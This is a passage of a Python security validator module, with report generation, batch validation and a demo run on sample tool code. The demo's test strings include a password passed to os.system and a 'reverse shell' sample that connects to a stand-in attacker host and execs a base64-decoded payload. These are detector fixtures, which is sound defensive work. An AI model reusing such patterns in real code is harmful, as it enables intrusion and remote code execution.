    
    def get_validation_history(self, tool_id: Optional[str] = None) -> Dict[str, ValidationResult]:
        """Get validation history for a tool or all tools."""
        if tool_id:
            return {tool_id: self.validation_history.get(tool_id)}
        return self.validation_history.copy()
    
    def set_max_threat_level(self, threat_level: ThreatLevel) -> None:
        """Set maximum allowed threat level."""
        self.max_threat_level = threat_level
        logger.info(f"Maximum threat level set to {threat_level.value}")
    
    def configure_analysis(
        self,
        enable_dynamic: bool = True,
        enable_signature: bool = True
    ) -> None:
        """Configure analysis options."""
        self.enable_dynamic_analysis = enable_dynamic
        self.enable_signature_detection = enable_signature
        
        logger.info(
            f"Analysis configuration updated: "
            f"dynamic={enable_dynamic}, signature={enable_signature}"
        )
    
    def generate_security_report(self, tool_id: str) -> Optional[Dict[str, Any]]:
        """Generate a comprehensive security report for a tool."""
        if tool_id not in self.validation_history:
            return None
        
        result = self.validation_history[tool_id]
        
        # Group findings by type and threat level
        findings_by_type = {}
        findings_by_threat = {}
        
        for finding in result.findings:
            vuln_type = finding.vulnerability_type.value
            threat_level = finding.threat_level.value
            
            if vuln_type not in findings_by_type:
                findings_by_type[vuln_type] = []
            findings_by_type[vuln_type].append(finding)
            
            if threat_level not in findings_by_threat:
                findings_by_threat[threat_level] = []
            findings_by_threat[threat_level].append(finding)
        
        # Generate recommendations
        recommendations = set()
        for finding in result.findings:
            recommendations.update(finding.recommendations)
        
        return {
            "tool_id": tool_id,
            "validation_timestamp": max([f.timestamp for f in result.findings]) if result.findings else time.time(),
            "is_safe": result.is_safe,
            "overall_threat_level": result.overall_threat_level.value,
            "analysis_summary": {
                "total_findings": len(result.findings),
                "analysis_duration": result.analysis_duration,
                "analyses_performed": [a.value for a in result.analyses_performed],
                "static_passed": result.static_analysis_passed,
                "dynamic_passed": result.dynamic_analysis_passed,
                "signature_passed": result.signature_check_passed
            },
            "findings_by_type": {
                vtype: len(findings) for vtype, findings in findings_by_type.items()
            },
            "findings_by_threat": {
                threat: len(findings) for threat, findings in findings_by_threat.items()
            },
            "top_findings": [
                finding.to_dict() for finding in sorted(
                    result.findings,
                    key=lambda f: ['safe', 'low', 'medium', 'high', 'critical'].index(f.threat_level.value),
                    reverse=True
                )[:5]
            ],
            "recommendations": list(recommendations),
            "metadata": result.metadata
        }
    
    async def batch_validate_tools(
        self,
        tools: Dict[str, str],
        security_context: Optional[SecurityContext] = None,
        max_concurrent: int = 3
    ) -> Dict[str, ValidationResult]:
        """Validate multiple tools concurrently."""
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def validate_single(tool_id: str, code: str) -> Tuple[str, ValidationResult]:
            async with semaphore:
                result = await self.validate_tool(
                    tool_id=tool_id,
                    code=code,
                    security_context=security_context
                )
                return tool_id, result
        
        # Execute validations concurrently
        tasks = [
            validate_single(tool_id, code)
            for tool_id, code in tools.items()
        ]
        
        results = await asyncio.gather(*tasks)
        return dict(results)


def create_tool_validator(**kwargs) -> ToolValidator:
    """
    Create a tool validator with the given configuration.
    
    Args:
        **kwargs: Validator configuration
        
    Returns:
        Configured tool validator
    """
    return ToolValidator(**kwargs)


if __name__ == "__main__":
    async def demo_tool_validator():
        """Demonstrate tool validator functionality."""
        print("🛡️ Tool Validator Demo")
        print("=" * 40)
        
        # Create validator
        validator = create_tool_validator()
        
        # Test cases
        test_tools = {
            "safe_tool": '''
def safe_function(x, y):
    """A safe mathematical function."""
    return x + y

result = safe_function(2, 3)
print(f"Result: {result}")
''',
            
            "suspicious_tool": '''
import os
import subprocess

def dangerous_function():
    """This function does dangerous things."""
    password = input("Enter password: ")
    os.system(f"echo {password}")
    return subprocess.Popen(["ls", "-la"])

result = dangerous_function()
''',
            
            "malicious_tool": '''
import base64
import socket

# Base64 encoded payload
payload = base64.b64decode("cHl0aG9uIC1jICJpbXBvcnQgb3M7IG9zLnN5c3RlbSgnbHMgLWxhJykgIg==")

# Create reverse shell
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("evil-server.com", 4444))
exec(payload)
'''
        }
        
        # Validate each tool
        for tool_id, code in test_tools.items():
            print(f"\n🔍 Validating {tool_id}:")
            print("-" * 30)
            
            result = await validator.validate_tool(
                tool_id=tool_id,
                code=code,
                skip_dynamic=False  # Enable full analysis
            )
            
            print(f"✓ Safe: {result.is_safe}")
            print(f"✓ Threat Level: {result.overall_threat_level.value}")
            print(f"✓ Findings: {len(result.findings)}")
            print(f"✓ Analysis Duration: {result.analysis_duration:.2f}s")
            print(f"✓ Analyses: {[a.value for a in result.analyses_performed]}")
            
            if result.findings:
                print("\n  Top Findings:")
                for finding in sorted(result.findings, 
                                    key=lambda f: ['safe', 'low', 'medium', 'high', 'critical'].index(f.threat_level.value),
                                    reverse=True)[:3]:
                    print(f"    - {finding.title} ({finding.threat_level.value})")
                    print(f"      {finding.description}")
        
        # Generate security report
        print(f"\n📊 Security Report for 'malicious_tool':")
        print("-" * 40)
        
        report = validator.generate_security_report("malicious_tool")
        if report:
            print(f"Total Findings: {report['analysis_summary']['total_findings']}")
            print(f"Analysis Duration: {report['analysis_summary']['analysis_duration']:.2f}s")
            print(f"Threat Distribution: {report['findings_by_threat']}")
            print(f"Vulnerability Types: {report['findings_by_type']}")
            
            if report['recommendations']:
                print("\nRecommendations:")
                for rec in list(report['recommendations'])[:3]:
                    print(f"  - {rec}")
        
        print("\n🛡️ Tool Validator Demo Complete")
    
    # Run demo
    asyncio.run(demo_tool_validator())